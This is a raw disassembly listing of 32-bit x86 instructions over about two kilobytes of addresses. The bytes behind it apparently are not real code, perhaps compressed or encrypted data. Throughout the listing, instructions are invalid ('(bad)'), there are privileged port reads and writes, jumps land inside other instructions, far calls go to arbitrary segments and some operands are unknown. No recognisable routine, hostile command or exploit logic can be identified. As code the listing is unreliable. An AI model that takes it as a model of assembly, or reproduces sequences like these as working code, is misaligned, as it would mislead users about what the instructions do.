  42616e:	cwde   
  42616f:	mov    cl,0xa8
  426171:	in     al,0xfd
  426173:	call   0x2f34:0x17b8d2f8
  42617a:	mov    eax,ds:0xe8072664
  42617f:	xchg   edi,eax
  426180:	jmp    0x426185
  426182:	inc    edi
  426183:	inc    esi
  426184:	sub    BYTE PTR [eax+0xa],ah
  426187:	mov    bh,dh
  426189:	inc    ebp
  42618a:	repnz mov esi,0x24e398eb
  426190:	aam    0x2c
  426192:	mov    ebp,0xbbf140c8
  426197:	inc    edi
  426198:	sub    ah,bl
  42619a:	dec    edi
  42619b:	es out 0x12,al
  42619e:	xchg   edx,eax
  42619f:	outs   dx,BYTE PTR ds:[esi]
  4261a0:	clc    
  4261a1:	pop    eax
  4261a2:	ins    DWORD PTR es:[edi],dx
  4261a3:	fadd   st(0),st
  4261a5:	addr16 sahf 
  4261a7:	retf   
  4261a8:	ret    
  4261a9:	adc    eax,0xb3cfe327
  4261ae:	mov    ah,0x7e
  4261b0:	xchg   DWORD PTR [edi-0x3],eax
  4261b3:	mov    WORD PTR [edi-0x40],gs
  4261b6:	jb     0x426174
  4261b8:	and    eax,0xef903a6b
  4261bd:	aaa    
  4261be:	dec    ebp
  4261bf:	mov    edi,0xc8b08f7e
  4261c4:	aam    0x25
  4261c6:	mov    ecx,DWORD PTR [ecx-0x20]
  4261c9:	add    BYTE PTR [ecx],ch
  4261cb:	xor    esp,ebp
  4261cd:	(bad)  
  4261ce:	adc    DWORD PTR [esi+0x5f11b02],esi
  4261d4:	mov    edi,DWORD PTR [eax+0x363a12e]
  4261da:	lock cs push ss
  4261dd:	fild   QWORD PTR [eax+0x30]
  4261e0:	pop    ebp
  4261e1:	outs   dx,DWORD PTR ds:[esi]
  4261e2:	add    ah,BYTE PTR [edi]
  4261e4:	jmp    0x25da:0x9f0169b5
  4261eb:	cmp    bh,cl
  4261ed:	mov    eax,ds:0x6f4b9847
  4261f2:	fistp  QWORD PTR [edi-0x2bfe33a1]
  4261f8:	imul   eax,DWORD PTR [ecx],0xfffffffd
  4261fb:	sbb    esp,DWORD PTR fs:[ebp+0x4c]
  4261ff:	adc    al,0xc2
  426201:	cdq    
  426202:	test   al,cl
  426204:	add    eax,0xe7ca6b9e
  426209:	cwde   
  42620a:	loopne 0x42628b
  42620c:	or     eax,DWORD PTR [ebx+ebx*4+0x4e5cebff]
  426213:	nop
  426214:	ja     0x4261dc
  426216:	adc    al,0xd2
  426218:	sub    bl,bh
  42621a:	dec    esp
  42621b:	inc    edi
  42621c:	(bad)  
  42621d:	call   0xd4fc:0x3f5a0292
  426224:	pop    esi
  426225:	nop
  426226:	xchg   BYTE PTR [eax],dl
  426228:	fld    TBYTE PTR [edi]
  42622a:	dec    esi
  42622b:	dec    eax
  42622c:	push   ds
  42622d:	lds    ebp,FWORD PTR [esi-0x44]
  426230:	sbb    ch,al
  426232:	jo     0x42623c
  426234:	data16 mov al,ds:0xfb57a7ce
  42623a:	cld    
  42623b:	in     eax,0x8b
  42623d:	sub    ecx,ecx
  42623f:	call   FWORD PTR [ebp-0x20]
  426242:	ss enter 0x44e8,0xf6
  426247:	jae    0x4262c7
  426249:	in     al,dx
  42624a:	arpl   di,sp
  42624c:	jmp    0x426248
  42624e:	jb     0x4261d4
  426250:	aad    0xa9
  426252:	jg     0x4262ce
  426254:	ret    0x7bdf
  426257:	ins    BYTE PTR es:[edi],dx
  426258:	sub    eax,0xffc32574
  42625d:	js     0x42625d
  42625f:	adc    edi,DWORD PTR [edx+0x4c9bed22]
  426265:	loop   0x426253
  426267:	inc    eax
  426268:	dec    ebp
  426269:	fcomip st,st(0)
  42626b:	test   eax,0xdc1d93e3
  426270:	xchg   ecx,eax
  426271:	adc    eax,0xa30b14fd
  426276:	bound  edi,QWORD PTR [edx]
  426278:	or     dl,dh
  42627a:	pop    esi
  42627b:	mov    ebp,0x4869a7d4
  426280:	mov    edi,DWORD PTR [edi+ecx*8-0x65]
  426284:	pop    ds
  426285:	leave  
  426286:	(bad)  
  426287:	(bad)  
  426288:	outs   dx,BYTE PTR ds:[esi]
  426289:	jbe    0x426211
  42628b:	std    
  42628c:	fwait
  42628d:	daa    
  42628e:	push   cs
  42628f:	pushf  
  426290:	sub    ch,ah
  426292:	std    
  426293:	fs or  bl,bh
  426296:	lds    esp,FWORD PTR ds:0xb1aa6325
  42629c:	jmp    0x426277
  42629e:	xchg   DWORD PTR [ebx+0x4f573149],esi
  4262a4:	pusha  
  4262a5:	(bad)  
  4262a7:	or     al,0xaf
  4262a9:	adc    DWORD PTR [edi-0x31],esi
  4262ac:	cs addr16 std 
  4262af:	sub    DWORD PTR [ecx-0x736cd19e],edx
  4262b5:	pop    edi
  4262b6:	or     edx,DWORD PTR [ebp+0x6d]
  4262b9:	pop    esp
  4262ba:	pop    ebp
  4262bb:	xor    bh,dl
  4262bd:	xchg   ecx,eax
  4262be:	dec    esp
  4262bf:	add    ah,ch
  4262c1:	cmp    al,0x21
  4262c3:	sahf   
  4262c4:	cdq    
  4262c5:	stos   BYTE PTR es:[edi],al
  4262c6:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4262c8:	xor    al,0xb6
  4262ca:	enter  0xefe4,0xdf
  4262ce:	pop    esi
  4262cf:	or     al,0x31
  4262d1:	test   BYTE PTR [eax+eax*1-0x1b],al
  4262d5:	sar    esp,1
  4262d7:	pop    ss
  4262d8:	iret   
  4262d9:	mov    dl,0x24
  4262db:	push   es
  4262dc:	pop    eax
  4262dd:	adc    DWORD PTR [ebx-0x35],0xee777309
  4262e4:	dec    edx
  4262e5:	cwde   
  4262e6:	mov    esp,0xf427205e
  4262eb:	dec    edx
  4262ec:	in     al,0xa7
  4262ee:	je     0x426298
  4262f0:	inc    eax
  4262f1:	cmp    BYTE PTR [edi+0x1b],ch
  4262f4:	adc    DWORD PTR [ebx+0x3cebacff],ebx
  4262fa:	mov    ecx,0xa4d0334a
  4262ff:	pop    ds
  426300:	jmp    0x426342
  426302:	arpl   WORD PTR fs:[edi],ax
  426305:	mov    al,ds:0xdf130bd6
  42630a:	ds cmp ebp,DWORD PTR cs:[ecx+0x4]
  42630f:	mov    ?,WORD PTR [esi+0x7]
  426312:	add    BYTE PTR [edx+0x6973874a],ah
  426318:	mov    ebx,0xc0fdf977
  42631d:	jmp    0x426336
  42631f:	mov    al,BYTE PTR [ebp+0x438321f]
  426325:	xor    dl,dh
  426327:	inc    ecx
  426328:	or     esp,DWORD PTR ds:0x968962fd
  42632e:	pop    gs
  426330:	out    0xe,al
  426332:	pop    es
  426333:	enter  0xe37a,0x34
  426337:	and    DWORD PTR [ebp-0x2],0x8eb436f
  42633e:	imul   ebx
  426340:	mov    al,ds:0x3e074b1f
  426345:	jmp    0xab3d2ded
  42634a:	pop    edi
  42634b:	jle    0x4262d1
  42634d:	sbb    al,0x3f
  42634f:	setns  BYTE PTR [edx]
  426352:	pop    ebp
  426353:	pop    edx
  426354:	mov    ch,0x2c
  426356:	add    al,0x6
  426358:	or     edx,DWORD PTR [edi+0x7d]
  42635b:	ss popf 
  42635d:	mov    esi,0xdf7244a6
  426362:	adc    dl,BYTE PTR [edi+0xa]
  426365:	outs   dx,BYTE PTR ds:[esi]
  426366:	xor    ah,BYTE PTR [edx-0x27]
  426369:	jb     0x426308
  42636b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42636c:	std    
  42636d:	in     al,dx
  42636e:	aaa    
  42636f:	mov    ds:0x9f9d16ab,eax
  426374:	fcmovnu st,st(0)
  426376:	lock (bad) 
  426378:	in     eax,0x85
  42637a:	cld    
  42637b:	add    eax,esp
  42637d:	sbb    BYTE PTR [ecx],dl
  42637f:	jmp    0x42636c
  426381:	leave  
  426382:	and    edi,edi
  426384:	lods   eax,DWORD PTR ds:[esi]
  426385:	je     0x426370
  426387:	jnp    0x426334
  426389:	fisttp WORD PTR [edi]
  42638b:	dec    ebp
  42638c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42638d:	clc    
  42638e:	into   
  42638f:	xlat   BYTE PTR ds:[ebx]
  426390:	sbb    DWORD PTR [edi+eiz*8+0x2005239f],esp
  426397:	retf   0x1b95
  42639a:	mov    DWORD PTR [ebx+edi*4-0x44],edx
  42639e:	pop    esi
  42639f:	dec    eax
  4263a0:	aas    
  4263a1:	call   0x2987:0x144ec808
  4263a8:	dec    ebp
  4263a9:	pop    ebx
  4263aa:	ja     0x42638f
  4263ac:	jmp    0x42638a
  4263ae:	rol    BYTE PTR [esi],1
  4263b0:	jg     0x426406
  4263b2:	loop   0x4263b3
  4263b4:	out    dx,eax
  4263b5:	pop    es
  4263b6:	sbb    eax,0x5a27f69
  4263bb:	mov    BYTE PTR [edi-0x2e],cl
  4263be:	repz repz shr BYTE PTR [eax],0xfd
  4263c3:	enter  0xc30e,0xae
  4263c7:	mov    WORD PTR [ebp-0x293828c3],es
  4263cd:	mov    eax,0x60d7fc42
  4263d2:	in     eax,dx
  4263d3:	ret    
  4263d4:	jmp    0x426378
  4263d6:	mov    ecx,0x1ccc0c1b
  4263db:	sbb    eax,0x6983dfba
  4263e0:	xchg   edi,eax
  4263e1:	dec    ebx
  4263e2:	das    
  4263e3:	inc    edx
  4263e4:	sbb    BYTE PTR [ebx+0x18ecb29e],bl
  4263ea:	jecxz  0x4263ed
  4263ec:	push   0xdb4a4958
  4263f1:	out    dx,al
  4263f2:	push   ebp
  4263f3:	enter  0x3474,0xd5
  4263f7:	shl    BYTE PTR [esi+0x79],cl
  4263fa:	mov    ecx,0xc5a7fdb3
  4263ff:	shr    BYTE PTR [ebx-0x616823bd],cl
  426405:	sbb    DWORD PTR [eax],eax
  426407:	mov    ebp,0xc94825fc
  42640c:	and    bl,BYTE PTR [eax]
  42640e:	data16 dec cx
  426411:	pop    ss
  426412:	in     eax,0x74
  426414:	jmp    0x4263b8
  426416:	cmp    eax,0xc9bd8b45
  42641b:	fst    QWORD PTR [esi+0x22c630df]
  426421:	xor    ebp,ebx
  426423:	cwde   
  426424:	sbb    dl,BYTE PTR [eax+0x12d92fd]
  42642a:	jbe    0x42645b
  42642c:	and    DWORD PTR [edi],esp
  42642e:	cli    
  42642f:	retf   0x2b60
  426432:	lea    eax,ds:0x4f64fd3b
  426438:	dec    edx
  426439:	(bad)  
  42643a:	and    DWORD PTR [ebp+0xb4102eb],ecx
  426440:	sahf   
  426441:	in     al,0xb7
  426443:	push   esp
  426444:	mov    al,ds:0x7f621ddf
  426449:	xlat   BYTE PTR ds:[ebx]
  42644a:	jle    0x4263d5
  42644c:	and    BYTE PTR [eax],bl
  42644e:	push   DWORD PTR [ebx+eiz*2]
  426451:	je     0x42641b
  426453:	cld    
  426454:	adc    al,0x3f
  426456:	xor    edi,DWORD PTR [eax+ebx*4+0x7cf91cdf]
  42645d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42645e:	jmp    0x42648f
  426460:	das    
  426461:	stc    
  426462:	sti    
  426463:	out    dx,eax
  426464:	mov    edi,0xbc574785
  426469:	and    ah,cl
  42646b:	sbb    ebp,ecx
  42646d:	pop    ds
  42646e:	test   BYTE PTR [edx],cl
  426470:	ret    
  426471:	or     bh,ch
  426473:	and    eax,0xfba5923
  426478:	clc    
  426479:	imul   edx,DWORD PTR [ebx-0x38],0x3c517ee2
  426480:	mov    cl,0xff
  426482:	adc    bl,al
  426484:	jmp    0x426449
  426486:	xor    bh,BYTE PTR [eax+0x5c]
  426489:	push   0xffffffea
  42648b:	inc    edx
  42648c:	js     0x426476
  42648e:	daa    
  42648f:	mov    WORD PTR [edi+ebx*8-0x4f],?
  426493:	dec    esp
  426494:	jmp    edi
  426496:	jmp    0x426485
  426498:	out    dx,al
  426499:	out    0x19,al
  42649b:	stos   DWORD PTR es:[edi],eax
  42649c:	sbb    al,0xe0
  42649e:	mov    WORD PTR ds:0x2703a2fb,fs
  4264a4:	pop    edi
  4264a5:	fisttp WORD PTR [edx]
  4264a7:	and    BYTE PTR ds:0xd614bfc5,bh
  4264ad:	sub    bh,ah
  4264af:	inc    ecx
  4264b0:	test   BYTE PTR [eax-0x23],ah
  4264b3:	fidiv  WORD PTR [ecx]
  4264b5:	adc    DWORD PTR ds:0x60fbc756,ebp
  4264bb:	enter  0x8f5c,0x77
  4264bf:	xor    bh,0x3b
  4264c2:	and    ebx,DWORD PTR [esi-0x15]
  4264c5:	adc    BYTE PTR fs:[esi-0x40a1351d],ah
  4264cc:	xor    cl,bl
  4264ce:	(bad)  
  4264cf:	cmp    eax,DWORD PTR [esi+0x22]
  4264d2:	fstp   st(0)
  4264d4:	ret    0xb5ef
  4264d7:	mov    ds:0x98c6d0ed,al
  4264dc:	push   0x38
  4264de:	mov    eax,ds:0xef30b5c8
  4264e3:	leave  
  4264e4:	repz fisttp WORD PTR [eax]
  4264e7:	push   eax
  4264e8:	adc    ebx,eax
  4264ea:	out    dx,eax
  4264eb:	mov    al,0xf
  4264ed:	lods   eax,DWORD PTR ds:[esi]
  4264ee:	and    eax,0x4275eb88
  4264f3:	xlat   BYTE PTR ds:[ebx]
  4264f4:	loop   0x426551
  4264f6:	mov    DWORD PTR [ebx-0x3d],edx
  4264f9:	fist   WORD PTR [ecx+eax*1]
  4264fc:	fwait
  4264fd:	pushw  0x7f60
  426501:	jmp    0xb11f9302
  426506:	xchg   esp,eax
  426507:	mov    al,ds:0xcbb5521b
  42650c:	(bad)  
  42650d:	test   ebp,0x9cff79da
  426513:	mov    bl,ah
  426515:	xor    BYTE PTR [ebp-0xc],al
  426518:	dec    ecx
  426519:	aam    0x4e
  42651b:	ret    0xd23e
  42651e:	jge    0x426563
  426520:	adc    BYTE PTR [edx+0x53a5fd5e],dl
  426526:	in     eax,0xa3
  426528:	scas   eax,DWORD PTR es:[edi]
  426529:	xlat   BYTE PTR ds:[ebx]
  42652a:	push   ecx
  42652b:	(bad)  
  42652c:	adc    ecx,DWORD PTR [edx-0x5a745e5e]
  426532:	push   esp
  426533:	div    DWORD PTR [edi+ebx*8]
  426536:	fimul  WORD PTR [esi+0x4e021f33]
  42653c:	mov    bh,0xe7
  42653e:	clc    
  42653f:	lods   al,BYTE PTR ds:[esi]
  426540:	or     dh,BYTE PTR [edi]
  426542:	popf   
  426543:	push   es
  426544:	sub    edi,DWORD PTR [ebp-0x203092b7]
  42654a:	stc    
  42654b:	ins    DWORD PTR es:[edi],dx
  42654c:	cmp    DWORD PTR [edx+ecx*8-0x97f5f07],0x4faa0a54
  426557:	dec    eax
  426558:	stc    
  426559:	aam    0x28
  42655b:	dec    esi
  42655c:	mov    ds:0x1bbb9f05,eax
  426561:	dec    ebx
  426562:	pop    ebp
  426563:	push   ss
  426564:	(bad)
  426567:	(bad)  
  426568:	hlt    
  426569:	and    ecx,esi
  42656b:	jg     0x426535
  42656d:	scas   al,BYTE PTR es:[edi]
  42656e:	cld    
  42656f:	shr    BYTE PTR [eax-0x7d],0xd9
  426573:	cmp    cl,BYTE PTR [esi+0x58]
  426576:	mov    ?,WORD PTR [esi-0x41384c57]
  42657c:	mov    edx,0xd7970b5f
  426581:	ret    0x1a6e
  426584:	jmp    0x4265c5
  426586:	adc    bh,BYTE PTR ds:0x9ac682bc
  42658c:	in     eax,0xdf
  42658e:	fs adc al,0x97
  426591:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426592:	popf   
  426593:	xchg   esi,eax
  426594:	rcl    DWORD PTR [edx-0xa],1
  426597:	xchg   BYTE PTR [ebx+0x4248214e],bh
  42659d:	mov    ebx,0xdf5618a0
  4265a2:	add    bh,ch
  4265a4:	or     al,BYTE PTR [ecx]
  4265a6:	sub    al,0xa5
  4265a8:	in     al,dx
  4265a9:	arpl   bp,di
  4265ab:	cdq    
  4265ac:	mov    cl,0x81
  4265ae:	push   esi
  4265af:	xchg   DWORD PTR [esi+0x601fd6ac],eax
  4265b5:	xchg   ebp,eax
  4265b6:	jp     0x4265e0
  4265b8:	ficomp DWORD PTR [ebx-0xd]
  4265bb:	ror    edx,1
  4265bd:	mov    ch,0x4e
  4265bf:	mov    DWORD PTR [esi+0x33d4812f],edi
  4265c5:	int    0xfd
  4265c7:	das    
  4265c8:	mov    eax,0x9538a4ec
  4265cd:	fistp  WORD PTR [edi]
  4265cf:	adc    dl,dl
  4265d1:	cs pushf 
  4265d3:	(bad)  
  4265d4:	out    0xd0,al
  4265d6:	lahf   
  4265d7:	mov    WORD PTR [ebx+ebx*1+0xe6a741d],fs
  4265de:	sub    ecx,eax
  4265e0:	arpl   cx,cx
  4265e2:	push   ebp
  4265e3:	call   0xc4928d67
  4265e8:	jmp    0x42657d
  4265ea:	lea    edx,[edx-0x6084dc77]
  4265f0:	xchg   ebx,eax
  4265f1:	fild   QWORD PTR [esi+0x56fc8a64]
  4265f7:	push   cs
  4265f8:	(bad)  
  4265fa:	cld    
  4265fb:	fidivr WORD PTR [edx+0xb]
  4265fe:	retf   
  4265ff:	nop
  426600:	test   eax,0xa6c7c3d8
  426605:	lea    eax,[eax]
  426607:	pop    es
  426608:	mov    ah,0xa0
  42660a:	test   BYTE PTR [edi],0xe
  42660d:	(bad)  
  42660e:	repnz sub ebx,0x41
  426612:	sub    DWORD PTR [ebx+0x24],ebx
  426615:	fucomp st(1)
  426617:	jnp    0x4265d6
  426619:	fisttp WORD PTR [ebx]
  42661b:	adc    al,0x1a
  42661d:	pcmpgtd mm1,QWORD PTR [edx]
  426620:	shl    BYTE PTR [edi-0x3],0xd8
  426624:	or     DWORD PTR [ebx-0x9],eax
  426627:	push   esp
  426628:	add    bl,bl
  42662a:	sbb    eax,0xfcb06a7c
  42662f:	sub    eax,0x5ddb65bf
  426634:	hlt    
  426635:	cmp    dh,ah
  426637:	lods   eax,DWORD PTR ds:[esi]
  426638:	in     eax,0xdf
  42663a:	inc    esp
  42663b:	mov    BYTE PTR [ecx],cl
  42663d:	push   ss
  42663e:	push   ecx
  42663f:	imul   ch
  426641:	ffreep st(6)
  426643:	(bad)  
  426644:	lahf   
  426645:	jge    0x426678
  426647:	in     eax,dx
  426648:	push   ds
  426649:	mov    edi,0x2d1c96fc
  42664e:	bound  ebx,QWORD PTR [eax-0x41]
  426651:	into   
  426652:	and    edi,DWORD PTR [ebp+0x87e4ac6]
  426658:	mov    cl,bl
  42665a:	jp     0x4266d1
  42665c:	or     DWORD PTR [eax-0x3],esp
  42665f:	cld    
  426660:	mov    bl,0xbb
  426662:	test   BYTE PTR [ecx],al
  426664:	clc    
  426665:	dec    edi
  426666:	ds leave 
  426668:	xchg   esp,eax
  426669:	jae    0x426630
  42666b:	icebp  
  42666c:	pop    ss
  42666d:	push   0xe2d5f859
  426672:	cld    
  426673:	adc    ch,BYTE PTR [eax-0xc]
  426676:	inc    esp
  426677:	xor    eax,DWORD PTR [ecx-0x2a]
  42667a:	adc    cl,al
  42667c:	adc    DWORD PTR [esi],0x5e
  42667f:	mov    es,WORD PTR [ebx+0x22]
  426682:	mov    BYTE PTR [ecx+0x229b15ea],dh
  426688:	dec    esi
  426689:	push   0x5a2540bf
  42668e:	clc    
  42668f:	int    0xbd
  426691:	cmp    al,0xdf
  426693:	popa   
  426694:	mov    ecx,eax
  426696:	sbb    al,0x3e
  426698:	mov    edx,0x1c57fd90
  42669d:	adc    DWORD PTR ds:0xda608860,edx
  4266a3:	mov    edx,0xc81e688e
  4266a8:	sub    bh,BYTE PTR [eax-0x27]
  4266ab:	aas    
  4266ac:	shl    BYTE PTR [esi],0xe6
  4266af:	and    ebx,DWORD PTR [esi+0x5d]
  4266b2:	inc    ebp
  4266b3:	pusha  
  4266b4:	(bad)  
  4266b5:	mov    ecx,0x635727f7
  4266ba:	push   ds
  4266bb:	leave  
  4266bc:	dec    esi
  4266bd:	ret    
  4266be:	jo     0x426703
  4266c0:	stos   BYTE PTR es:[edi],al
  4266c1:	add    al,0x37
  4266c3:	mov    DWORD PTR [eax-0x46],esi
  4266c6:	dec    edx
  4266c7:	sub    al,0x3e
  4266c9:	mov    ds:0xb3e8e1fc,eax
  4266ce:	jne    0x42669a
  4266d0:	sbb    eax,0x469073b6
  4266d5:	cmp    al,0xfd
  4266d7:	or     BYTE PTR [edx],ch
  4266d9:	cmova  esi,DWORD PTR ds:0x32fd0795
  4266e0:	call   0x8c49:0x5a1659c1
  4266e7:	sub    al,0xc
  4266e9:	ffreep st(5)
  4266eb:	xor    dh,BYTE PTR [eax]
  4266ed:	push   esp
  4266ee:	fcom   DWORD PTR [esi]
  4266f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4266f1:	adc    esp,esp
  4266f3:	inc    eax
  4266f4:	push   ebp
  4266f5:	pusha  
  4266f6:	popa   
  4266f7:	mov    eax,0xe7e45a92
  4266fc:	test   al,0x4d
  4266fe:	cmp    BYTE PTR [esi-0x2ed8205d],ch
  426704:	ret    0xba23
  426707:	jge    0x426689
  426709:	push   edx
  42670a:	add    BYTE PTR [eax+0x7acec981],dl
  426710:	inc    ecx
  426711:	push   esp
  426712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426713:	and    BYTE PTR [ebx],al
  426715:	leave  
  426716:	jns    0x426748
  426718:	jmp    0x4204:0x661c05dc
  42671f:	pushf  
  426720:	push   ebx
  426721:	and    eax,edx
  426723:	mov    bl,0xeb
  426725:	repz jae 0x426795
  426728:	xor    eax,0x9986ee65
  42672d:	fmul   DWORD PTR [edx+0x4d]
  426730:	xor    al,0xdb
  426732:	mov    esp,0x6bd37eef
  426737:	pusha  
  426738:	jmp    0x4266e5
  42673a:	jecxz  0x42675b
  42673c:	xchg   esi,eax
  42673d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42673e:	pop    ecx
  42673f:	fldcw  WORD PTR [edi-0x2e]
  426742:	or     eax,0xdc5945c8
  426747:	and    esi,ebx
  426749:	mov    ebp,0xcdebe3e1
  42674e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42674f:	add    bh,ch
  426751:	jp     0x42670c
  426753:	hlt    
  426754:	fild   WORD PTR es:[edi-0x7081f0b6]
  42675b:	cs jecxz 0x4266f6
  42675e:	cld    
  42675f:	dec    ebp
  426760:	dec    ebx
  426761:	push   ebp
  426762:	xor    BYTE PTR [ebp+0x19],ch
  426765:	jb     0x4266e8
  426767:	mov    esp,0xc80120f2
  42676c:	jmp    0x5ac14825
  426771:	imul   ebx,DWORD PTR [ebx-0x66551454],0x1ab994f8
  42677b:	mov    ch,BYTE PTR ds:0x2c28a1df
  426781:	sub    bl,bh
  426783:	(bad)  
  426785:	ret    
  426786:	cld    
  426787:	xchg   DWORD PTR [ebx+0x58],ecx
  42678a:	jne    0x426802
  42678c:	test   al,0x8d
  42678e:	jo     0x426761
  426790:	icebp  
  426791:	jmp    FWORD PTR [esi]
  426793:	mov    ecx,0x569b0eeb
  426798:	sub    edx,DWORD PTR [ecx]
  42679a:	std    
  42679b:	mov    eax,ds:0xc43d570e
  4267a0:	loop   0x42681a
  4267a2:	int3   
  4267a3:	enter  0x5f2,0xd2
  4267a7:	int    0xc2
  4267a9:	adc    eax,0x1ddf9c67
  4267ae:	fadd   st,st(7)
  4267b0:	sbb    dl,BYTE PTR [edi+0x762ee91a]
  4267b6:	mov    ds:0xaa956cc8,eax
  4267bb:	icebp  
  4267bc:	pop    ds
  4267bd:	addr16 push 0xffffffa2
  4267c0:	jmp    0x4267b2
  4267c2:	ja     0x42678b
  4267c4:	mov    esi,0xf963c10f
  4267c9:	loop   0x42684a
  4267cb:	repnz adc DWORD PTR [ecx+0x4b],edi
  4267cf:	dec    eax
  4267d0:	jb     0x42683c
  4267d2:	stc    
  4267d3:	out    dx,al
  4267d4:	jmp    0x426761
  4267d6:	or     BYTE PTR [ebx-0x4cc1f065],cl
  4267dc:	popf   
  4267dd:	fistp  QWORD PTR [ebx*1+0x5819a6a8]
  4267e4:	jmp    0x8769:0x3acfcc3
  4267eb:	pop    ebp
  4267ec:	inc    edi
  4267ed:	ds push esp
  4267ef:	ror    DWORD PTR [esi],1
  4267f1:	mov    esp,0x29ea8c5b
  4267f6:	add    dl,BYTE PTR [edx+0x5b]
  4267f9:	shl    BYTE PTR [eax+0x39eebec],cl
  4267ff:	es xor al,dl
  426802:	aaa    
  426803:	or     edi,esp
  426805:	rol    DWORD PTR [ebx-0x18131738],cl
  42680b:	pop    edi
  42680c:	ss jae 0x4267ae
  42680f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426810:	jmp    0x4267b2
  426812:	dec    ebp
  426813:	dec    esi
  426814:	(bad)  
  426815:	lock call 0x3792:0xae9af72
  42681d:	lahf   
  42681e:	jmp    0x47ffa1f
  426823:	adc    edx,DWORD PTR [edi+eax*2]
  426826:	sar    BYTE PTR [esi-0x7718d015],1
  42682c:	adc    DWORD PTR [ebp-0x1],esp
  42682f:	jge    0x426841
  426831:	aam    0x9f
  426833:	shl    BYTE PTR [ebp-0x77602ab],cl
  426839:	outs   dx,BYTE PTR ds:[esi]
  42683a:	push   ds
  42683b:	sbb    eax,0x4b705beb
  426840:	inc    esp
  426841:	mov    ebp,0xd8de6021
  426846:	xor    cl,bl
  426848:	cmp    DWORD PTR [ebx],ebp
  42684a:	(bad)  [edx+0x673b414b]
  426850:	jmp    0x4268cf
  426852:	inc    ecx
  426853:	loope  0x4267e8
  426855:	ja     0x42689f
  426857:	lock ja 0x426842
  42685a:	mov    edx,0x3e9f8f24
  42685f:	pop    ebx
  426860:	adc    bh,cl
  426862:	ret    0xeb00
  426865:	mov    ds:0x2a130a1,eax
  42686a:	xchg   BYTE PTR [esi],bh
  42686c:	dec    edx
  42686d:	fcomip st,st(1)
  42686f:	imul   DWORD PTR [eax+0x15]
  426872:	sub    dh,dh
  426874:	xor    BYTE PTR [esp+edi*8-0xb0caaff],dh
  42687b:	mov    ds:0xc8aa1b06,eax
  426880:	mov    ch,0xd6
  426882:	cdq    
  426883:	outs   dx,DWORD PTR ds:[esi]
  426884:	jecxz  0x4268c2
  426886:	lock xchg ebx,eax
  426888:	repnz sahf 
  42688a:	jo     0x4268c9
  42688c:	dec    ebx
  42688d:	fcomp  QWORD PTR [edx]
  42688f:	adc    edi,DWORD PTR [edx-0x28b955b1]
  426895:	fistp  QWORD PTR [edx]
  426897:	daa    
  426898:	aam    0x83
  42689a:	jecxz  0x42687f
  42689c:	je     0x4268a4
  42689e:	std    
  42689f:	pop    edi
  4268a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4268a1:	nop
  4268a2:	rol    BYTE PTR [ecx],cl
  4268a4:	mov    ah,0xbd
  4268a6:	repz into 
  4268a8:	cld    
  4268a9:	push   eax
  4268aa:	xchg   esi,eax
  4268ab:	mov    edx,0x472472cb
  4268b0:	cs xor ebp,eax
  4268b3:	jmp    0x9fe8:0xc7736068
  4268ba:	sub    al,0xb
  4268bc:	rol    DWORD PTR [edi-0x742136cc],1
  4268c2:	(bad)  
  4268c3:	ins    DWORD PTR es:[edi],dx
  4268c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4268c5:	fisub  DWORD PTR [ebp-0x3405bf4]
  4268cb:	jp     0x4268a8
  4268cd:	jmp    0x4268e4
  4268cf:	cmp    eax,edx
  4268d1:	leave  
  4268d2:	or     dh,0xfc
  4268d5:	add    al,0xd4
  4268d7:	test   DWORD PTR [ebx],ebp
  4268d9:	rol    ah,1
  4268db:	fild   DWORD PTR [edx]
  4268dd:	adc    esp,esi
  4268df:	aas    
  4268e0:	pusha  
  4268e1:	pop    esi
  4268e2:	mov    ebx,0xbcadbbce
  4268e7:	std    
  4268e8:	aaa    
  4268e9:	mov    ebp,0x2d78c8f5
  4268ee:	daa    
  4268ef:	add    DWORD PTR [ebp-0x56ff36e6],ecx
  4268f5:	fdiv   st(4),st
  4268f7:	jge    0x4268c9
  4268f9:	int    0xcc
  4268fb:	jg     0x426949
  4268fd:	int3   
  4268fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268ff:	xchg   ebp,eax
  426900:	sub    ebp,eax
  426902:	iret   
  426903:	retf   
  426904:	or     DWORD PTR [ebx+ebp*4-0x4a],eax
  426908:	inc    edi
  426909:	retf   
  42690a:	push   esi
  42690b:	push   edi
  42690c:	or     al,0xf6
  42690e:	ss adc ch,cl
  426911:	fdiv   st(4),st
  426913:	pop    ebx
  426914:	sbb    DWORD PTR [edi+0x53],esi
  426917:	into   
  426918:	mov    ah,0x26
  42691a:	or     eax,0x9fdfc326
  42691f:	mov    edi,0x1e166650
  426924:	inc    eax
  426925:	xchg   ebx,eax
  426926:	std    
  426927:	mov    esp,0x2db8b475
  42692c:	xchg   ecx,eax
  42692d:	or     DWORD PTR [esp+0x19e2674c],esp
  426934:	loop   0x42691f
  426936:	or     eax,0xb0dfb2c7
  42693b:	lods   eax,DWORD PTR ds:[esi]
  42693c:	adc    ebx,DWORD PTR [edx-0x62]
  42693f:	pop    ds
  426940:	jmp    0x4268e3
  426942:	xchg   edi,eax
  426943:	sbb    DWORD PTR [esi-0x7e6be61e],0x27fe25dc
  42694d:	cli    
  42694e:	xlat   BYTE PTR ds:[ebx]
  42694f:	lahf   
  426950:	imul   edi,DWORD PTR [esi-0x4],0xffffff8c
  426954:	cmc    
  426955:	loope  0x426985
  426957:	cmp    eax,0xee3175eb
  42695c:	or     BYTE PTR [edx+ebx*8+0x73c149c7],ch
  426963:	in     eax,0x3
  426965:	push   esp
  426966:	and    ch,BYTE PTR [ebp-0x15]
  426969:	dec    edx
  42696a:	leave  
  42696b:	push   ebx
  42696c:	jae    0x4269a2
  42696e:	mov    esp,0xb0df8097
  426973:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426974:	fidiv  WORD PTR [ebx+0x0]
